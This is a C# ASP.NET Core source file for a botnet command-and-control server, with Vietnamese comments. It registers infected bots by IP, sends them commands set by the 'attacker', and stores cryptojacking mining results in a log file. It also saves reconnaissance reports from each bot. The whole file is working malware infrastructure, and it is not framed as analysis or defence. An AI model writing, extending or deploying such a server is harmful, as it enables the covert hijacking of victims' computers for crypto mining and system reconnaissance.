using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;
using System.IO;
using System.Text.RegularExpressions;

namespace CncServer.Controllers
{
    // === MODEL NHẬN TỪ CLIENT ===
    public class BotInfoPayload
    {
        public string Status { get; set; } = string.Empty;
    }

    public class LogPayload
    {
        public string Message { get; set; } = string.Empty; 
    }

    public class ResultPayload
    {
        public long Nonce { get; set; }
        public string Hash { get; set; } = string.Empty;
    }
    // Model cho request đặt lệnh
    public class SetCommandRequest
    {
        public string Command { get; set; } = string.Empty;
    }

    public class BotInfo
    {
        public string BotIp { get; set; } = string.Empty;
        public DateTime LastSeen { get; set; }
        public string Status { get; set; } = string.Empty;
    }
    public class CryptoJackResult
    { 
        public string BotIp { get; set; } = string.Empty;
        public long Nonce { get; set; }
        public string Hash { get; set; } = string.Empty;
        public DateTime Timestamp { get; set; } = DateTime.UtcNow;
    }
    public class ReconPayload
    {
        public string Report { get; set; } = string.Empty;
    }
    //public class LogRequest
    //{
    //    public string BotIp { get; set; } = string.Empty;
    //    public string Message { get; set; } = string.Empty;
    //}

    [ApiController]
    [Route("bot")]
    public class BotController : ControllerBase
    {
        private static readonly ConcurrentDictionary<string, BotInfo> _bots = new ConcurrentDictionary<string, BotInfo>();
        private static string _command = "idle";
        //private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();
        private static readonly object _fileLock = new object();
        private const string LogFileName = "mined_hashes.txt";

        // Hàm helper để lấy IP của Bot
        private string GetBotIp()
        {
            //return HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
            var ip = HttpContext.Connection.RemoteIpAddress;
            if (ip == null) return "Unknown";

            // Nếu là IPv4 bọc trong IPv6 (::ffff:10.0.2.6) -> Chuyển về 10.0.2.6
            if (ip.IsIPv4MappedToIPv6)
            {
                return ip.MapToIPv4().ToString();
            }
            return ip.ToString();
        }

        [HttpPost("checkin")]
        public IActionResult CheckIn([FromBody] BotInfoPayload payload)
        {
            // Tự động gán BotIp bằng IP của người gửi request
            //string ip = GetBotIp();
            //var botInfo = new BotInfo
            //{
            //    BotIp = ip,                              // ← ĐỔI TÊN
            //    LastSeen = DateTime.UtcNow,
            //    Status = payload?.Status ?? "unknown"
            //};


            //_bots[ip] = botInfo;
            //Console.ForegroundColor = ConsoleColor.Blue;
            //Console.WriteLine($"[+] Bot connected from: {ip} | Status: {botInfo.Status}");
            //Console.ResetColor();
            //return Ok();
            string ip = GetBotIp();
            string newStatus = payload?.Status ?? "unknown";

            bool shouldLog = false;
            string logMsg = "";

            // Kiểm tra xem Bot này đã có trong danh sách chưa
            if (_bots.TryGetValue(ip, out BotInfo existingBot))
            {
                // Nếu Bot ĐÃ tồn tại: Chỉ log nếu Status bị thay đổi
                if (existingBot.Status != newStatus)
                {
                    shouldLog = true;
                    logMsg = $"[*] Bot {ip} changed status: {existingBot.Status} -> {newStatus}";
                }

                // Cập nhật thông tin mới (Status + LastSeen)
                existingBot.Status = newStatus;
                existingBot.LastSeen = DateTime.UtcNow;
            }
            else
            {
                // Nếu Bot CHƯA tồn tại (Bot mới): Luôn log
                shouldLog = true;
                logMsg = $"[+] New Bot connected: {ip} | Status: {newStatus}";

                var newBot = new BotInfo
                {
                    BotIp = ip,
                    LastSeen = DateTime.UtcNow,
                    Status = newStatus
                };
                _bots[ip] = newBot;
            }

            // Chỉ in ra màn hình nếu cần thiết
            if (shouldLog)
            {
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine(logMsg);
                Console.ResetColor();
            }

            return Ok();
        }

        [HttpGet("getcommand")]
        public IActionResult GetCommand()
        {
            string ip = GetBotIp();

            if (_bots.ContainsKey(ip))
            {
                // Cập nhật last seen khi bot hỏi lệnh
                _bots[ip].LastSeen = DateTime.UtcNow;
                return Ok(new { command = _command });
            }
            // Nếu bot chưa checkin mà hỏi lệnh, bắt nó checkin trước (hoặc vẫn trả lệnh default)
            return Ok(new { command = _command });
        }

        // === NÂNG CẤP: Nhận một model JSON thay vì chuỗi thô ===
        [HttpPost("setcommand")]
        public IActionResult SetCommand([FromBody] SetCommandRequest request)
        {
            if (string.IsNullOrWhiteSpace(request?.Command))
            {
                return BadRequest("Command model is invalid.");
            }
            _command = request.Command.ToLower(); // Chuẩn hóa lệnh thành chữ thường
            Console.WriteLine($"\n[*] New command issued by attacker: '{_command}'\n");
            return Ok($"Command set to: {_command}");
        }

        [HttpGet("list")]
        public IActionResult ListBots()
        {
            return Ok(_bots.Values);
        }

        [HttpPost("submitresult")]
        public IActionResult SubmitResult([FromBody] ResultPayload payload)
        {
            //if (result == null || string.IsNullOrEmpty(result.BotId))
            //{
            //    return BadRequest("Invalid result data.");
            //}
            //_results.Add(result);
            //Console.ForegroundColor = ConsoleColor.Green;
            //Console.WriteLine($"[SUCCESS] Bot {result.BotId} found a hash!");
            //Console.WriteLine($"   -> Nonce: {result.Nonce}, Hash: {result.Hash.Substring(0, 10)}...");
            //Console.ResetColor();
            //return Ok("Result received.");
            //if (result == null) return BadRequest("Invalid result data.");
            if (payload == null) return BadRequest("Invalid result data.");

            string ip = GetBotIp();
            //result.BotIp = GetBotIp();
            var result = new CryptoJackResult
            {
                BotIp = ip,                                  // ← ĐỔI TÊN
                Nonce = payload.Nonce,
                Hash = payload.Hash,
                Timestamp = DateTime.UtcNow
            };
            //result.Timestamp = DateTime.UtcNow;

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[SUCCESS] Bot {result.BotIp} found a hash!");
            Console.WriteLine($"   -> Nonce: {result.Nonce}, Hash: {result.Hash.Substring(0, 10)}...");
            Console.ResetColor();
            try
            {
                // Format log dễ parse: [Time]|IP|Nonce|Hash
                string logEntry = $"{result.Timestamp:O}|{result.BotIp}|{result.Nonce}|{result.Hash}";

                lock (_fileLock)
                {
                    System.IO.File.AppendAllText(LogFileName, logEntry + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Write file error: {ex.Message}");
            }

            return Ok("Result received.");
        }

        [HttpGet("results")]
        //public IActionResult GetResults()
        //{
        //    return Ok(_results.OrderByDescending(r => r.Timestamp));
        //}
        public IActionResult GetResults()
        {
            var results = new List<CryptoJackResult>();

            lock (_fileLock)
            {
                if (System.IO.File.Exists(LogFileName))
                {
                    var lines = System.IO.File.ReadAllLines(LogFileName);
                    foreach (var line in lines)
                    {
                        try
                        {
                            // Tách chuỗi dựa trên dấu |
                            var parts = line.Split('|');
                            if (parts.Length >= 4)
                            {
                                results.Add(new CryptoJackResult
                                {
                                    Timestamp = DateTime.Parse(parts[0]),
                                    BotIp = parts[1],
                                    Nonce = long.Parse(parts[2]),
                                    Hash = parts[3]
                                });
                            }
                        }
                        catch { /* Bỏ qua dòng lỗi */ }
                    }
                }
            }

            // Trả về danh sách mới nhất lên đầu
            return Ok(results.OrderByDescending(r => r.Timestamp));
        }

        [HttpPost("submitrecon")]
        public IActionResult SubmitRecon([FromBody] ReconPayload payload)
        {
            if (payload == null || string.IsNullOrWhiteSpace(payload.Report))
                return BadRequest("Invalid recon data.");

            string ip = GetBotIp();
            string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");

            // Tạo tên file riêng cho từng bot: recon_IP_Time.txt
            // Thay thế dấu : trong IP (nếu là IPv6) để tránh lỗi tên file
            string safeIp = ip.Replace(":", "_");
            string fileName = $"recon_{safeIp}_{timestamp}.txt";

            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine($"[RECON] Received report from {ip}. Saving to {fileName}...");
            Console.ResetColor();

            try
            {
                // Lưu file vào thư mục chạy của Server
                System.IO.File.WriteAllText(fileName, payload.Report);
                return Ok("Recon report saved.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Save recon file failed: {ex.Message}");
                return StatusCode(500, "Internal Server Error");
            }
        }

        [HttpPost("log")]
        public IActionResult LogStatus([FromBody] LogPayload payload)
        {
            //if (logRequest == null) return BadRequest("Invalid log data.");
            if (payload == null) return BadRequest("Invalid log data.");

            // Tự lấy IP làm ID
            string ip = GetBotIp();

            // In log ra console của SERVER với màu sắc để dễ phân biệt
            Console.ForegroundColor = ConsoleColor.Gray;
            //Console.WriteLine($"[LOG] {ip}: {logRequest.Message}");
            Console.WriteLine($"[LOG] {ip}: {payload.Message}");
            Console.ResetColor();

            return Ok("Log received.");
        }
    }
}